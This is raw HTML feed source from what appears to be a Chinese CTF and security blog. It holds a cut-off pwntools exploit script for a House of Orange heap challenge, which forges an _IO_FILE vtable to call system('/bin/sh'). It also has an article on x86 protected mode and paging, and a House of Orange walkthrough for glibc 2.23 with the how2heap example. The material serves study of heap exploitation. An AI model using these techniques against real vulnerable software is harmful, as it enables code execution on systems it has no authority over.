class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露基地址</span></span><br><span class="line">new(<span class="number">0x200000</span>)<span class="comment">#libcbase</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(rl(),<span class="number">16</span>)+<span class="number">0x201000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libcelf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libcelf.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libcelf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#放入unsortedbin</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10df1</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x15000</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#防止unlink</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10dd1</span>)+p64(unsorted_bin)*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10db0</span>+p64(<span class="number">0x10dd0</span>)+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># 大块切割一部分，小块放入smallbin</span></span><br><span class="line">new(<span class="number">0x10d00</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">heap=<span class="built_in">int</span>(rl(),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#溢出到第二个块</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#布置orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr 绕过检测</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0大小达到 mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#到达_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtable指向下面写入下面数据的地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">edit(payload)</span><br><span class="line">b()</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
            <tag> Unsorted Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IA-32 x86保护模式(Protected mode)</title>
      <link href="/2023/04/08/32bit-x86-protected-mode/"/>
      <url>/2023/04/08/32bit-x86-protected-mode/</url>
      
        <content type="html"><![CDATA[<h1 id="IA-32-x86-Protected-mode"><a href="#IA-32-x86-Protected-mode" class="headerlink" title="IA-32 x86 Protected mode"></a>IA-32 x86 Protected mode</h1><h2 id="Real-address-Mode"><a href="#Real-address-Mode" class="headerlink" title="Real-address Mode"></a>Real-address Mode</h2><p>实模式简称Real mode，这就要从我们x86的ancestor 8086处理器说起，这个时候我们使用的地址都是物理地址</p><p>&gt;&gt;&gt;为什么会有段寄存器cs ds es ss?</p><ul><li><p>8086处理器面临的第一个问题就是20位地址总线和16bit寄存器的问题:解决这个问题是把段寄存器左移4个bit位，形成20bit段地址，再加上16位的偏移地址进行20位寻址,这也决定了段地址必须是按16字节对齐的，因为16位寄存器，所以每个段最大限长为64KB，同时同一个物理地址对应着多个逻辑地址</p></li><li><p>第二个问题就是程序重定位的问题，我们的指令是由操作码和操作数构成(小部分只有操作码)，如果我们指令里的操作数是一个绝对地址，我们程序加载的位置是不确定的，所以我们代码和数据的地址也不是确定的，所以绝对地址是不可行的，处理器采用了内存分段机制，这种分段是逻辑上的分段，并不是物理上的分段,段地址:偏移地址，我们指令里的操作数写相对于段地址的相对偏移地址，就可以正确重定位</p></li></ul><p><code>物理地址（physicaladdress）=段值（segment） * 16 + 偏移（offset）</code></p><p>32位处理器之后我们给这个取了个名字叫实模式</p><p><strong>实模式的问题</strong></p><ol><li>缺乏保护机制：实模式下没有保护机制，也没有内存管理单元（MMU）来保护内存免受非授权访问和操作系统进程之间的干扰。这使得操作系统和应用程序容易受到恶意代码的攻击。</li><li>缺乏多任务支持：实模式下，只能运行一个程序，并且程序必须在处理器的控制下运行，因为没有任何机制来切换到其他程序。这个限制意味着操作系统无法支持多任务处理，这限制了计算机的性能和效率。</li></ol><h2 id="Protected-mode"><a href="#Protected-mode" class="headerlink" title="Protected mode"></a>Protected mode</h2><p>保护模式是在80286(16位)引入，80386(32位)开始盛行</p><p>80386 32位地址总线最多支持4GB的物理内存，视为IA-32(Intel Architecture)架构的开始</p><p>开始了平坦内存模型（flat memory model），整个内存都在一个段里，即每个应用程序可以使用地址0～2^32-1来索引</p><p>CRO寄存器的最低位PE(Protection Enable)标志为1处理器进入保护模式</p><p>&gt;&gt;&gt;怎么保护</p><p>对内存进行权限控制，那就应该会有权限信息的描述，段寄存器只有16位(其实是可见部分只有16位，还有80位是不可见,描述属性(16)，基址(32)，界限(32))而且只有几个，每一个程序都需要多个单独的描述信息，那就需要存放在内存里</p><h3 id="分段机制"><a href="#分段机制" class="headerlink" title="分段机制"></a>分段机制</h3><h4 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h4><p>就出现了段描述符(segment descriptor)，8字节长的数据结构，用来描述一个段的位置、大小、访问控制和状态等信息，</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200038198.png" alt="image-20230420200038198"></p><ul><li>32位段基地址，段起始位置</li><li>20位的段边界，段边界的扩展最值,即最大扩展到多少或最小扩展到多少。扩展方向只有上下两种,栈和数据段代码段区别(DNA里的恐惧:segmentation fault)</li><li>G(Granularity)是粒度来描述段边界，G为0，段边界以字节为单位，为1(1B~1M)，则以4k为单位(4K~4G)</li><li>S(System)，S&#x3D;0代表该描述符描述的是一个系统段，S&#x3D;1代表该描述符描述的是代码段、数据段或堆栈段</li><li>DPL(Descriptor Privilege Level）描述符特权级0-3，0最高，高的可以访问低的，反之不行，比如操作系统的代码和数据会被放在比用户程序具有更高特权的段里,DPL表示访问这个段对当前特权级(CPL)的最低等级要求</li><li>TYPE和S段配合使用，段的访问权限或系统控制描述类型</li></ul><p> CPU 硬件负责检测，操作系统提供异常处理程序</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195852680.png" alt="image-20230420195852680"></p><p>描述信息这么乱是为了兼容80286</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200152426.png" alt="image-20230420200152426"></p><h4 id="段描述符表"><a href="#段描述符表" class="headerlink" title="段描述符表"></a>段描述符表</h4><p>系统中会有很多段描述符，代码段要占用一个段描述符、数据段和栈段等，多个内存段也要各自占用一个段描述符，cpu定的全局描述符表（Global Descriptor Table，GDT）局部描述符表LDT(Local descriptor table)是一个段描述符数组，里面存的就是这些描述符</p><p>全局描述符表(系统只有一个)的地址存放在GDTR寄存器里，局部描述符表在LDTR寄存器，表由操作系统维护，cpu硬件来使用</p><h4 id="GDTR寄存器"><a href="#GDTR寄存器" class="headerlink" title="GDTR寄存器"></a>GDTR寄存器</h4><p>48位</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408155337790.png" alt="image-20230408155337790"></p><p>32位线性地址描述全局描述符表在内存里的位置。16位表长度描述表的大小(为0时大小是1)，byte为单位，所以最大2^16&#x2F;8&#x3D;8192个描述符</p><h4 id="LDTR寄存器"><a href="#LDTR寄存器" class="headerlink" title="LDTR寄存器"></a>LDTR寄存器</h4><p>局部描述符表寄存器LDTR表示当前任务的LDT在GDT中的索引，也是一个段选择子</p><h4 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h4><p>有了段描述符，段寄存器里面就不需要存段基地址，而是存的段选择子</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408172110614.png" alt="image-20230408172110614"></p><ul><li>TI位代表要索引的段描述符表（table indicator），TI&#x3D;0表示全局描述符表，TI&#x3D;1表示局部描述符表。</li><li>高13位是描述符索引，要选择的段描述符在TI所表示的段描述符表中的索引号</li><li>RPL（Requestor Privilege Level）请求特权级，表示我将以什么样的身份去访问，比如我现在cpl为0，我可以以rpl为3或0的身份去访问，之所以会有3的身份和我们有时候怕失误修改一个可修改的文件从而以只读权限打开该文件一样</li><li>(cs(ss)[cs和ss特权级一样]寄存器中的RPL字段表示当前特权级(Current Privilege Level，CPL))，和段描述符里的DPL配合cpu做检查</li></ul><p>这样通过段选择子和GDTR，就可以定位到段描述符，找到段基地址，加上偏移找到线性地址，如果没有分页机制这样取出来的线性地址就是我们的物理地址</p><p>取出一次后会放入程序员不可见部分—段描述符缓冲寄存器（ Descriptor Cache Registers ),下次会直接从这里面取，，只要往段寄存器中赋值， CPU 就会更新段描述符缓冲寄存器</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200014884.png" alt="image-20230420200014884"></p><h4 id="linux中的分段机制"><a href="#linux中的分段机制" class="headerlink" title="linux中的分段机制"></a>linux中的分段机制</h4><p>RISC对分段支持有限，linux为了更好的移植性，简化了分段机制，在初始化时就把段描述符里的基地址设为0，段边界设置为0xfffff，每个段都能访问4G</p><h3 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h3><p>分段会造成一些问题</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408194444921.png" alt="image-20230408194444921"></p><ul><li><p>这样一个分段内存，如果此时BD程序停止，此时如果有一个程序F占3个内存块，虽然内存里由三个空闲内存，但是却不是连续的无法加载我们的程序F，时间长了会造成大量内存碎片，</p></li><li><p>另一个问题是程序跑起来后有些代码和数据可能很久都不会用到，但是在分段下我们还必须加载到内存，造成内存浪费</p></li><li><p>分段下我们没办法动态分配我们程序的内存，因为在分段下加载到内存的块大小是必须要提前计算好的</p></li><li><p>物理内存太小时，程序就不能加载</p></li></ul><p>在分段的前提上在加一层东西</p><p>分页把线性地址和物理地址空间都划分为页面，linux一般使用4k大小的页面，分页机制的主要目的是高效地利用内存，按页来组织和管理内存空间，把暂时不用的数据交换到空间较大的外部存储器（通常是硬盘）上（称为page out，换出），需要时再交换回来（称为page in，换进）同时，可以将逻辑上连续的线性地址映射的物理地址可以不连续，把内存碎片利用起来。现用现映射，不用不映射，所以从理论上，我们只需要8k的内存就可以跑一个程序，4k数据，4k代码，不断进行内存和硬盘的转换</p><p>操作系统的虚拟内存也是利用分页来实现的</p><p>CRO寄存器的PG为为1时开启分页</p><p><strong>创建进程时，就会为这个进程创建页表，进程空间隔离主要因为每个进程都有一套相对独立的页表,映射过的物理内存会在页表里登记这个映射关系，进程的切换会伴随着页表的切换</strong></p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195713371.png" alt="image-20230420195713371"></p><p>CR3寄存器便是用来记录当前任务的页表物理地址。</p><h4 id="一级页表"><a href="#一级页表" class="headerlink" title="一级页表"></a>一级页表</h4><p>只有一级页表的话需要有2^20次方个表项，表项里用4个字节存放页面的开始物理基地址，由于页时4k大小对齐，所以低12位始终为0，不用记录，低十二位用来存放一些权限信息</p><p>我们用线性地址的高20位去索引页表数组，再加上线性地址的低12位偏移就可以得到物理地址</p><p>一级页表的缺点是，2^20次方个4字节的表项需要4M的连续物理内存去存储，每个进程都有一个单独的页表，n个进程，4*nM的内存消耗太大</p><h4 id="32位经典分页"><a href="#32位经典分页" class="headerlink" title="32位经典分页"></a>32位经典分页</h4><p><strong>二级页表</strong></p><p>CR0的PG标志为1、CR4的PAE为0时，使用这个模式，在这个模式下，页表结构为两级，第一级称为页目录表（Page Directory Table），第二级称为页表（Page Table)，最终属性的是由页目录项和页表项相与(PDE&amp;PTE)来决定的<br>页目录存放在一个4K大小的页面上，存放1024个指向一个二级页表地址，二级页表大小也是一个页面，最多含有1K个4字节页表项(Page-Table Entry，PTE)</p><p>每个二级页表存放1024个物理页的地址，1024*4KB&#x3D;4MB，1024个二级页表1024*4MB&#x3D;4GB,满足4G寻址</p><p>目录项</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195930886.png" alt="image-20230420195930886"></p><p>页表项</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195952065.png" alt="image-20230420195952065"></p><p>查找过程</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420191045242.png" alt="image-20230420191045242"></p><ol><li>通过CR3寄存器定位到页目录的起始地址,取线性地址的高10位x4作为索引选取页目录的目录项(由于一个目录项是4字节，所以x4)</li><li>那么根据页目录项中的页表基地址(高20位)和低12位为0，定位到二级页表</li><li>取线性地址的12位到21位（共10位）x4，作为索引选取二级页表的一个页表项</li><li>取出页表项的页表基地址</li><li>取线性地址的低12位作为页中偏移和上一步基地址相加得到物理地址</li></ol><blockquote><p>这个时候一想，4k大小的二级页表有1024个，还外加一个4k目录表这不比之前的4M还大4k？</p><p>这个时候我们分析下目录项的作用</p><ol><li>页目录项的P位表示是否在物理内存，这就说明二级页表本身也可能被交换到虚拟内存中，只有一部分需要的二级页表被加载到物理内存，其余可以放到磁盘，目录项的如果P位为0会触发缺页异常，缺页异常调用内核中的缺页异常处理程序把需要的页面映射到物理内存</li><li>有了这个机制我们可以把页表分散到物理内存不同位置，而不是在一块连续的4M物理内存空间</li><li>4k的页目录是一直在物理内存上的</li></ol><p>多级页表的坏处在于tlb不命中处罚加剧，二级页表就需要两次访存，一次用于页目录，另一次用于 PTE 本身</p></blockquote><h4 id="这种地址转换都是硬件来自动完成的，操作系统来处理缺页"><a href="#这种地址转换都是硬件来自动完成的，操作系统来处理缺页" class="headerlink" title="这种地址转换都是硬件来自动完成的，操作系统来处理缺页"></a>这种地址转换都是硬件来自动完成的，操作系统来处理缺页</h4><h2 id="64位linux内存分页"><a href="#64位linux内存分页" class="headerlink" title="64位linux内存分页"></a>64位linux内存分页</h2><p>目前64位linux基本上都采用四级分页模型</p><ul><li>PGD：page Global directory(47-39), 页全局目录</li><li>PUD：Page Upper Directory(38-30)，页上级目录</li><li>PMD：page middle directory(29-21)，页中间目录</li><li>PTE：page table entry(20-12)，页表项</li></ul><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230826213151091.png" alt="image-20230826213151091"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Protected Mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Orange 2.23 and below</title>
      <link href="/2023/04/06/House-of-orange/"/>
      <url>/2023/04/06/House-of-orange/</url>
      
        <content type="html"><![CDATA[<h2 id="House-Of-Orange-glibc-version-2-23-and-below"><a href="#House-Of-Orange-glibc-version-2-23-and-below" class="headerlink" title="House Of Orange glibc version 2.23 and below"></a>House Of Orange glibc version 2.23 and below</h2><p>很巧妙精细的攻击思路，核心和精彩之处是在没有free函数时如何进行heap attack</p><p>先看一下偏移把</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">FILE struct size: 0xd8</span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">chain - fp: 0x68</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">mode - fp: 0xc0</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_ptr - fp: 0x28</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_base - fp: 0x20</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">vtable_offset - fp: 0x82</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">read_ptr - fp: 0x8</span></span><br></pre></td></tr></table></figure><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当前堆的top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>_int_malloc中依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，没有的话,接下来操作topchunk,还不满足的话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sysmalloc去向操作系统申请，有 mmap 和 brk 两种分配方式，我们需要的是brk提升堆顶，所以我们分配的 chunk 大小要小于 mmap 分配阈值，默认为 128K</p><p>brk时会对top chunk size 检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;<span class="comment">//av时main_arean，取top chunk最高处</span></span><br><span class="line">  old_size = chunksize (old_top);<span class="comment">//top chunk 大小</span></span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">//oldtop+oldsize</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||<span class="comment">//==0是说明第一次malloc时</span></span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>要求我们</p><ol><li>伪造的 size 必须要对齐到内存页(一般4k),因为topchunk+size是最后一个堆块的边界</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>测试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fake_size 0xfd1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    ptr=(<span class="type">void</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">40</span>);<span class="comment">//0x20+8=40到topchunk的size</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">long</span> <span class="type">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc(0x20)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151240973.png" alt="image-20230406151240973"></p><p>0x602030+0x20fd0&#x3D;0x623000 4k对齐的，为了满足<code>(unsigned long) old_end &amp; (pagesize - 1)) == 0)</code>我们伪造的size要时0xfd1 0x1fd1 0x2fd1等等</p><p><code>    *((long long*)ptr)=fake_size;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151445090.png" alt="image-20230406151445090"></p><p><code>malloc(0x1000)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151803663.png" alt="image-20230406151803663"></p><p> <code>malloc(0x60);</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406152257567.png" alt="image-20230406152257567"></p><p><img src="/2023/04/06/House-of-orange/image-20230406152317119.png" alt="image-20230406152317119"></p><h3 id="how2heap-example"><a href="#how2heap-example" class="headerlink" title="how2heap example"></a>how2heap example</h3><p><strong>md，这个注释写的太好了orz</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span 